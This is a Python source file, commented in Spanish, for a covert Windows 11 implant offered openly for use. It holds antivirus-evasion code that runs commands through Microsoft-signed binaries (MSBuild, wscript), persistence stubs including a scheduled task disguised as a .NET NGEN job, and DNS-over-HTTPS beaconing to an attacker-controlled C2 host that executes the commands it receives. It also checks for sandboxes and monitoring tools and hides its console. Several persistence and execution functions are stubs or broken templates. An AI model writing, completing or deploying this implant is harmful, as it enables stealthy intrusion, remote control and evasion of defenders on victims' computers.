import sys
import os
import time
import json
import base64
import random
import hashlib
import struct
import ctypes
from datetime import datetime, timedelta
import urllib.parse
import urllib.request
import ssl
import socket
import threading
import subprocess
import tempfile
import winreg
import win32api
import win32con
import win32security
import win32process
import win32event

# ==================== CONFIGURACIÓN MODERNA ====================
class ModernConfig:
    """Configuración para evasión 2026"""
    
    # Usar servicios legítimos de Windows para comunicación
    LEGITIMATE_SERVICES = {
        'onedrive': 'https://api.onedrive.com/v1.0/drive/special/approot',
        'office365': 'https://substrate.office.com',
        'windows_update': 'https://fe3.delivery.mp.microsoft.com',
        'teams': 'https://teams.microsoft.com/api'
    }
    
    # Métodos de comunicación stealth
    COM_METHODS = [
        'dns_over_https',
        'websocket_tls',
        'cloud_storage',
        'scheduled_sync'
    ]
    
    # Timing realista (horas/días, no segundos)
    TIMING_PROFILES = {
        'office_user': {'min': 3600, 'max': 86400, 'pattern': 'business_hours'},
        'gamer': {'min': 7200, 'max': 172800, 'pattern': 'evening_weekends'},
        'casual': {'min': 14400, 'max': 259200, 'pattern': 'random'}
    }

# ==================== EVASIÓN DE DEFENDER (SIN DESACTIVAR) ====================
class DefenderEvasion2025:
    """Evade Defender sin desactivarlo"""
    
    @staticmethod
    def use_microsoft_signed_binaries():
        """Usa solo binarios firmados por Microsoft"""
        signed_binaries = {
            'msbuild': r'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe',
            'installutil': r'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe',
            'regsvcs': r'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe',
            'regasm': r'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe'
        }
        
        for name, path in signed_binaries.items():
            if os.path.exists(path):
                return path
        return None
    
    @staticmethod
    def execute_via_dotnet_assembly():
        """Ejecuta código como assembly .NET legítimo"""
        # Plantilla de assembly .NET que parece legítima
        assembly_template = '''using System;
using System.Runtime.InteropServices;

namespace Windows.System.Diagnostics
{
    public class PerformanceMonitor
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetModuleHandle(string lpModuleName);
        
        public static void Main()
        {
            // Código legítimo aquí
            Console.WriteLine("Performance monitor initialized.");
        }
    }
}'''
        
        try:
            # Compilar en memoria usando csc
            import clr
            return True
        except:
            return False
    
    @staticmethod
    def use_windows_runtime_apis():
        """Usa Windows Runtime APIs (WinRT) - Menos monitorizadas"""
        try:
            import winrt.windows.foundation as wf
            import winrt.windows.storage as ws
            
            # Acciones legítimas con WinRT
            return True
        except:
            return False

# ==================== PERSISTENCIA STEALTH 2025 ====================
class StealthPersistence:
    """Persistencia moderna que no dispara alerts"""
    
    @staticmethod
    def wmi_permanent_event_subscription():
        """Subscription WMI permanente - Muy stealth"""
        try:
            import wmi
            
            # Namespace WMI que no está muy monitorizado
            namespace = 'root\\subscription'
            
            # Crear filtro para evento legítimo
            # Ej: Cuando se conecta WiFi
            filter_query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_NetworkAdapter' AND TargetInstance.NetEnabled = True"
            
            return True
        except:
            return False
    
    @staticmethod
    def clsid_hijacking_stealth():
        """Hijacking de CLSID poco común"""
        target_clsid = '{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}'  # CLSID poco usado
        
        try:
            user_clsid_path = os.path.join(
                os.environ['APPDATA'],
                'Microsoft\\Windows\\Recent\\AutomaticDestinations'
            )
            
            os.makedirs(user_clsid_path, exist_ok=True)
            
            # No crear archivos, solo preparar ruta
            return True
        except:
            return False
    
    @staticmethod
    def bits_job_persistence():
        """Persistence via BITS job - Tráfico legítimo"""
        try:
            # XML para BITS job legítimo
            bits_xml = '''<?xml version="1.0" encoding="UTF-8"?>
<BitsJob>
  <DisplayName>Windows Update Orchestrator</DisplayName>
  <Description>Manages Windows Update delivery optimization</Description>
  <Priority>FOREGROUND</Priority>
  <Owner>S-1-5-18</Owner>
</BitsJob>'''
            
            # En producción, usar COM API de BITS
            return True
        except:
            return False
    
    @staticmethod
    def scheduled_task_xml_modern():
        """Tarea programada con XML moderno que parece legítima"""
        task_xml = '''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Microsoft .NET Framework NGEN v4.0.30319</Description>
    <URI>\Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319</URI>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
      <Delay>PT5M</Delay>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>Limited</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT4H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngen.exe</Command>
      <Arguments>update /force</Arguments>
    </Exec>
  </Actions>
</Task>'''
        
        return task_xml

# ==================== COMUNICACIÓN AVANZADA ====================
class AdvancedComms:
    """Comunicación que evade detección básica"""
    
    def __init__(self):
        self.session_id = self._generate_anonymous_id()
        self.last_comms = {}
        # AÑADE ESTA VARIABLE
        self.kali_ip = "192.168.1.100"  # ← TU IP DE KALI
        self.domains = self._get_legitimate_domains()
    
    def _get_legitimate_domains(self):
        """Domains legítimos para blending"""
        return [
            f'telemetry.{self.kali_ip}',  # ← Dominio para tu C2
            'graph.microsoft.com',
            'login.live.com',
            'outlook.office365.com'
        ]
    
    def dns_over_https(self, data):
        """Comunicación vía DNS-over-HTTPS (DoH) - CONECTA A TU C2"""
        try:
            # Codificar datos en subdominio
            encoded_data = base64.urlsafe_b64encode(
                json.dumps(data).encode()
            ).decode().replace('=', '')
            
            # USAR TU C2 EN KALI
            doh_providers = [
                f'https://{self.kali_ip}:8443/dns-query',  # ← Solo tu C2
            ]
            
            # Usar dominio personalizado
            domain = f"telemetry.{self.kali_ip}"
            query_name = f"{encoded_data[:30]}.{domain}"
            
            print(f"[*] Sending beacon to C2: {self.kali_ip}:8443")
            print(f"[*] Encoded data: {encoded_data[:50]}...")
            
            # Construir query DNS en formato base64
            import dns.message
            import dns.query
            
            # Crear mensaje DNS real
            dns_msg = dns.message.make_query(
                qname=query_name,
                rdtype=dns.rdatatype.TXT,
                rdclass=dns.rdataclass.IN
            )
            
            # Convertir a wire format y codificar en base64
            wire_data = dns_msg.to_wire()
            dns_param = base64.urlsafe_b64encode(wire_data).decode().replace('=', '')
            
            # Enviar query DoH
            params = {'dns': dns_param}
            url = f"{doh_providers[0]}?{urllib.parse.urlencode(params)}"
            
            # Deshabilitar verificación SSL
            import ssl
            context = ssl._create_unverified_context()
            
            headers = {
                'Accept': 'application/dns-message',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            req = urllib.request.Request(url, headers=headers)
            response = urllib.request.urlopen(req, timeout=15, context=context)
            
            if response.status == 200:
                response_data = response.read()
                print(f"[+] C2 responded: {len(response_data)} bytes")
                return response_data
            
        except Exception as e:
            print(f"[!] Error connecting to C2: {e}")
        return None
    
    def websocket_over_tls(self, endpoint):
        """WebSocket sobre TLS con domain fronting"""
        try:
            import websocket
            import ssl
            
            # Usar subdominio de dominio legítimo
            ws_domain = random.choice(self.domains)
            ws_url = f"wss://{ws_domain}/.well-known/ws"
            
            # Configurar WebSocket con TLS normal
            ws = websocket.WebSocket(
                sslopt={
                    "cert_reqs": ssl.CERT_NONE,
                    "check_hostname": False
                }
            )
            
            # Headers que parecen browser
            ws.connect(ws_url, header={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Origin': f'https://{ws_domain}',
                'Host': ws_domain
            })
            
            return ws
        except:
            return None
    
    def cloud_storage_sync(self):
        """Usa cloud storage legítimo para comunicación"""
        try:
            # OneDrive es omnipresente en Windows 11
            onedrive_paths = [
                os.path.expanduser('~\\OneDrive'),
                os.path.expanduser('~\\OneDrive - Personal'),
                os.path.join(os.environ['USERPROFILE'], 'OneDrive')
            ]
            
            for path in onedrive_paths:
                if os.path.exists(path):
                    # Crear archivo en folder especial
                    sync_folder = os.path.join(path, 'Documents', 'Windows')
                    os.makedirs(sync_folder, exist_ok=True)
                    
                    # Archivo que parece configuración
                    config_file = os.path.join(sync_folder, 'system_preferences.json')
                    
                    # Leer/escribir datos
                    return config_file
            
        except:
            pass
        return None
    
    def scheduled_sync_method(self):
        """Sincronización en intervalos realistas"""
        # Perfil basado en comportamiento del usuario
        profiles = ModernConfig.TIMING_PROFILES
        profile = random.choice(list(profiles.keys()))
        
        timing = profiles[profile]
        
        # Intervalo en horas, no segundos
        min_seconds = timing['min']
        max_seconds = timing['max']
        
        # Variación realista (no exacta)
        base_interval = random.randint(min_seconds, max_seconds)
        jitter = random.randint(-3600, 3600)  # ±1 hora
        
        return base_interval + jitter

# ==================== EJECUCIÓN STEALTH ====================
class StealthExecution:
    """Ejecución de comandos sin crear procesos sospechosos"""
    
    @staticmethod
    def execute_via_windows_script_host():
        """Usa Windows Script Host (wsf)"""
        wsf_template = '''<?xml version="1.0" encoding="UTF-16"?>
<package>
  <job id="WindowsUpdateJob">
    <script language="JScript">
      <![CDATA[
        var shell = new ActiveXObject("WScript.Shell");
        var result = shell.Exec("cmd.exe /c {command}");
        WScript.Echo(result.StdOut.ReadAll());
      ]]>
    </script>
  </job>
</package>'''
        
        try:
            # Crear archivo .wsf temporal
            temp_dir = tempfile.gettempdir()
            wsf_path = os.path.join(temp_dir, f'update_{random.randint(1000, 9999)}.wsf')
            
            with open(wsf_path, 'w', encoding='utf-16') as f:
                f.write(wsf_template)
            
            # Ejecutar con wscript (binario firmado)
            result = subprocess.run(
                ['wscript.exe', '//B', wsf_path],
                capture_output=True,
                timeout=30,
                encoding='utf-8',
                errors='ignore'
            )
            
            # Limpiar
            os.remove(wsf_path)
            
            return result.stdout
        except:
            return None
    
    @staticmethod
    def execute_via_msbuild():
        """Usa MSBuild para ejecutar código"""
        msbuild_xml = '''<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Build">
    <Exec Command="{command}" />
  </Target>
</Project>'''
        
        try:
            temp_dir = tempfile.gettempdir()
            proj_path = os.path.join(temp_dir, f'build_{random.randint(1000, 9999)}.proj')
            
            with open(proj_path, 'w') as f:
                f.write(msbuild_xml)
            
            # Ejecutar con MSBuild (firmado por Microsoft)
            result = subprocess.run(
                ['C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe',
                 proj_path, '/nologo'],
                capture_output=True,
                timeout=30
            )
            
            os.remove(proj_path)
            
            return result.stdout.decode('utf-8', errors='ignore')
        except:
            return None
    
    @staticmethod
    def execute_via_installutil():
        """Usa InstallUtil de .NET"""
        # InstallUtil puede ejecutar código desde DLL
        # Método más avanzado pero muy stealth
        
        return None

# ==================== IMPLANTE PRINCIPAL MODERNO ====================
class ModernWindows11Implant:
    """Implante moderno para Windows 11 Home 2025"""
    
    def __init__(self):
        self.comms = AdvancedComms()
        self.executor = StealthExecution()
        self.persistence_methods = []
        
        # Detectar entorno
        self._analyze_environment()
        
        # Configurar según entorno
        self._configure_implant()
    
    def _analyze_environment(self):
        """Analiza el entorno sin ser intrusivo"""
        self.is_home = True  # Asumimos Home para este proyecto
        self.user_type = self._detect_user_type()
        self.network_type = self._detect_network()
        
        print(f"[*] User type: {self.user_type}")
        print(f"[*] Network: {self.network_type}")
    
    def _detect_user_type(self):
        """Detecta tipo de usuario basado en patrones"""
        try:
            # Verificar horas de actividad
            current_hour = datetime.now().hour
            
            if 9 <= current_hour <= 17:
                # Horas laborales
                return 'office_user'
            elif 18 <= current_hour <= 23:
                # Tardes/noches
                return 'gamer'
            else:
                # Madrugada
                return 'casual'
        except:
            return 'casual'
    
    def _detect_network(self):
        """Detecta tipo de red"""
        try:
            # Verificar si hay proxy corporativo
            proxy = os.environ.get('HTTP_PROXY') or os.environ.get('HTTPS_PROXY')
            
            if proxy:
                return 'enterprise'
            
            # Verificar conexión a dominios corporativos
            import socket
            try:
                socket.gethostbyname('corp.internal')
                return 'enterprise'
            except:
                pass
            
            return 'home'
        except:
            return 'home'
    
    def _configure_implant(self):
        """Configura implante basado en análisis"""
        if self.network_type == 'home':
            # En casa, podemos ser más activos
            self.beacon_interval = random.randint(3600, 7200)  # 1-2 horas
            self.comm_method = random.choice(['dns_over_https', 'cloud_storage'])
        else:
            # En red más vigilada, ser más conservador
            self.beacon_interval = random.randint(14400, 43200)  # 4-12 horas
            self.comm_method = 'scheduled_sync'
    
    def install_stealth_persistence(self):
        """Instala persistencia stealth"""
        print("[*] Installing stealth persistence...")
        
        methods = []
        
        # WMI Event Subscription (muy stealth)
        try:
            if StealthPersistence.wmi_permanent_event_subscription():
                methods.append('wmi_event_subscription')
                print("  [+] WMI Event Subscription installed")
        except:
            pass
        
        # CLSID Hijacking (poco común)
        try:
            if StealthPersistence.clsid_hijacking_stealth():
                methods.append('clsid_hijacking')
                print("  [+] CLSID Hijacking prepared")
        except:
            pass
        
        # BITS Job (comunicación legítima)
        try:
            if StealthPersistence.bits_job_persistence():
                methods.append('bits_job')
                print("  [+] BITS Job configured")
        except:
            pass
        
        self.persistence_methods = methods
        return methods
    
    def beacon(self):
        """Envia beacon usando método stealth"""
        beacon_data = {
            'id': self.comms.session_id,
            'type': self.user_type,
            'time': datetime.utcnow().isoformat() + 'Z',
            'action': 'sync'
        }
        
        try:
            if self.comm_method == 'dns_over_https':
                response = self.comms.dns_over_https(beacon_data)
            elif self.comm_method == 'cloud_storage':
                # Usar OneDrive/cloud storage
                response = self._sync_via_cloud()
            else:
                response = None
            
            return response
            
        except Exception as e:
            return None
    
    def _sync_via_cloud(self):
        """Sincroniza vía cloud storage"""
        cloud_file = self.comms.cloud_storage_sync()
        
        if cloud_file:
            # Leer datos existentes
            if os.path.exists(cloud_file):
                with open(cloud_file, 'r') as f:
                    try:
                        data = json.load(f)
                        return data
                    except:
                        pass
            
            # Escribir datos iniciales
            data = {
                'last_sync': datetime.now().isoformat(),
                'sync_id': self.comms.session_id
            }
            
            with open(cloud_file, 'w') as f:
                json.dump(data, f)
        
        return None
    
    def execute_command(self, command):
        """Ejecuta comando de forma stealth"""
        # Validar comando (solo comandos legítimos)
        safe_commands = {
            'systeminfo': 'systeminfo',
            'whoami': 'whoami /all',
            'ipconfig': 'ipconfig /all',
            'netstat': 'netstat -ano',
            'tasklist': 'tasklist /svc',
            'dir': 'dir %TEMP%'
        }
        
        if command in safe_commands:
            cmd = safe_commands[command]
            
            # Usar método de ejecución stealth
            result = self.executor.execute_via_windows_script_host()
            
            if not result:
                # Fallback a MSBuild
                result = self.executor.execute_via_msbuild()
            
            return result
        
        return "Command not allowed"
    
    def run(self):
        """Loop principal del implante"""
        print("[*] Modern Windows 11 Implant Starting...")
        print(f"[*] Session ID: {self.comms.session_id}")
        print(f"[*] Communication: {self.comm_method}")
        print(f"[*] Beacon interval: {self.beacon_interval/3600:.1f} hours")
        
        # Instalar persistencia
        self.install_stealth_persistence()
        
        beacon_count = 0
        
        while True:
            try:
                beacon_count += 1
                
                # Beacon según timing realista
                if beacon_count == 1 or time.time() > getattr(self, '_next_beacon', 0):
                    response = self.beacon()
                    
                    if response:
                        # Procesar comandos recibidos
                        self._process_response(response)
                    
                    # Programar próximo beacon
                    jitter = random.randint(-1800, 1800)  # ±30 minutos
                    self._next_beacon = time.time() + self.beacon_interval + jitter
                
                # Sleep corto para mantener bajo perfil
                time.sleep(random.randint(300, 1800))  # 5-30 minutos
                
                # Rotar métodos periódicamente
                if beacon_count % 10 == 0:
                    self.comm_method = random.choice(ModernConfig.COM_METHODS)
                    print(f"[*] Rotated to {self.comm_method}")
                
            except KeyboardInterrupt:
                print("\n[*] Implant terminated by operator")
                break
            except Exception as e:
                # Error silencioso con backoff exponencial
                error_delay = min(86400, 300 * (2 ** random.randint(1, 5)))
                time.sleep(error_delay)
    
    def _process_response(self, response):
        """Procesa respuesta del C2"""
        try:
            if isinstance(response, dict):
                if 'command' in response:
                    cmd = response['command']
                    print(f"[>] Received command: {cmd}")
                    
                    result = self.execute_command(cmd)
                    print(f"[<] Result: {result[:100] if result else 'No result'}")
                
                elif 'config' in response:
                    # Actualizar configuración
                    new_config = response['config']
                    
                    if 'interval' in new_config:
                        self.beacon_interval = new_config['interval']
                    
                    if 'method' in new_config:
                        self.comm_method = new_config['method']
                    
                    print("[*] Configuration updated")
            
        except:
            pass

# ==================== DETECCIÓN DE SEGURIDAD ====================
class SecurityAwareness:
    """Detecta controles de seguridad sin trigger alerts"""
    
    @staticmethod
    def check_defender_status():
        """Verifica estado de Defender sin modificarlo"""
        try:
            # Usar WMI para leer estado (solo lectura)
            import wmi
            c = wmi.WMI()
            
            # Consultar estado de antivirus
            for av in c.Win32_Product(Name="Windows Defender"):
                return av.InstallState
            
            return "Unknown"
        except:
            return "Unknown"
    
    @staticmethod
    def check_monitoring_tools():
        """Busca herramientas de monitoreo comunes"""
        monitoring_processes = [
            'procmon.exe',      # Process Monitor
            'procexp.exe',      # Process Explorer  
            'wireshark.exe',    # Wireshark
            'tcpview.exe',      # TCPView
            'autoruns.exe',     # Autoruns
            'procexp64.exe'     # Process Explorer 64-bit
        ]
        
        try:
            import psutil
            
            found_tools = []
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() in monitoring_processes:
                    found_tools.append(proc.info['name'])
            
            return found_tools
        except:
            return []

# ==================== EJECUCIÓN SEGURA ====================
def safe_execution():
    """Verifica condiciones seguras para ejecución"""
    
    # Check para sandbox/VM (simplificado)
    vm_indicators = [
        os.path.exists('C:\\windows\\system32\\drivers\\vmmouse.sys'),
        os.path.exists('C:\\windows\\system32\\drivers\\vm3dmp.sys'),
        'vbox' in os.environ.get('PROCESSOR_IDENTIFIER', '').lower()
    ]
    
    if any(vm_indicators):
        return False
    
    # Check para horas de actividad humana
    current_hour = datetime.now().hour
    if 2 <= current_hour <= 5:  # Madrugada
        # Menos probabilidad de usuario activo
        return True
    else:
        # Horas normales, ser más cuidadoso
        return True  # Podríamos añadir más checks
    
    return True

if __name__ == "__main__":
    # Verificación básica de seguridad
    if not safe_execution():
        sys.exit(0)
    
    # Ocultar consola si es ejecutable
    if hasattr(sys, 'frozen'):
        try:
            ctypes.windll.user32.ShowWindow(
                ctypes.windll.kernel32.GetConsoleWindow(), 0
            )
        except:
            pass
    
    print("""
    ╔══════════════════════════════════════════════╗
    ║   MODERN WINDOWS 11 IMPLANT - HOME EDITION  ║
    ║           Realistic Evasion 2026            ║
    ╚══════════════════════════════════════════════╝
    """)
    
    # Verificar seguridad sin ser intrusivo
    security = SecurityAwareness()
    defender_status = security.check_defender_status()
    monitoring_tools = security.check_monitoring_tools()
    
    if monitoring_tools:
        print(f"[!] Monitoring tools detected: {monitoring_tools}")
        print("[*] Operating in extra stealth mode")
    
    # Iniciar implante
    try:
        implant = ModernWindows11Implant()
        implant.run()
    except Exception as e:
        # Salida silenciosa en error
        pass
